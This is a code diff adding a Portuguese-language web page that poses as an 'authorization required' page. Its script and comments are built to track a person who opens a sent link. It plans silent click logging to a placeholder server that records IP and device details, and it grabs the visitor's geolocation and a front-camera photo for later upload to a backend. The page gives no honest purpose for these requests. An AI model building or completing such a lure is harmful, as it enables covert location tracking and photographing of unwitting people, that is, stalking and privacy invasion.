@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Acesso</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; margin: 10px; font-size: 16px; cursor: pointer; }
+        video, canvas { display: none; max-width: 100%; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <h2>Autorização Necessária</h2>
+    <p>Para continuar, libere o acesso solicitado abaixo.</p>
+
+    <button onclick="solicitarLocalizacao()">Enviar Localização</button>
+    <button onclick="solicitarCamera()">Tirar Foto</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // 1. GATILHO AUTOMÁTICO: Roda assim que a página é acessada
+        window.onload = function() {
+            notificarAcessoImediato();
+        };
+
+        function notificarAcessoImediato() {
+            // Para fins de teste, isso vai gerar um aviso na tela.
+            // Na versão final, isso será silencioso.
+            alert("Aviso para o sistema: A pessoa acabou de clicar no link!");
+
+            /* Quando seu servidor Python estiver pronto, o código real será semelhante a este:
+            
+            fetch('https://seu-servidor-python.com/api/registrar-clique', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    evento: 'link_clicado',
+                    data_hora: new Date().toISOString()
+                    // O IP e o modelo do celular (User-Agent) são capturados automaticamente 
+                    // pelo seu servidor Python quando essa requisição bate lá.
+                })
+            });
+            */
+        }
+
+        // 2. Função para solicitar e capturar a Localização
+        function solicitarLocalizacao() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        alert(`Localização obtida!\nLat: ${lat}\nLon: ${lon}`);
+                        // Futuramente: fetch() para enviar lat/lon para o backend
+                    },
+                    function(error) {
+                        alert("Acesso à localização negado ou indisponível.");
+                    }
+                );
+            } else {
+                alert("Geolocalização não suportada pelo navegador.");
+            }
+        }
+
+        // 3. Função para solicitar a Câmera e tirar a foto
+        async function solicitarCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                video.style.display = "block"; 
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imagemBase64 = canvas.toDataURL('image/png');
+                    alert("Foto capturada com sucesso!");
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = "none";
+
+                    // Futuramente: fetch() para enviar imagemBase64 para o backend
+                }, 1500); 
+
+            } catch (error) {
+                alert("Acesso à câmera negado.");
+            }
+        }
+    </script>
+</body>
+</html>
